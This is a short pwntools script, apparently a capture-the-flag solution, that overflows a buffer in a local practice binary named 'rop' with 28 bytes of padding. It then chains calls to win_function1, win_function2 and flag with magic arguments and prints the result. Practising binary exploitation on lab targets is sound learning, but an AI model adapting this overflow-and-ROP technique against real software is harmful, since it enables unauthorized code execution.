from __future__ import print_function
import pwn

elf = pwn.ELF("rop")
rop = pwn.ROP(elf)

p = pwn.tubes.process.process(["./rop"], shell=True)

prompt = p.read()

rop.raw(rop.generatePadding(0, 28))

rop.win_function1()
rop.win_function2(0xbaaaaaad)
rop.flag(0xdeadbaad)

p.sendline(rop.chain())
prompt = p.read()
print(prompt)
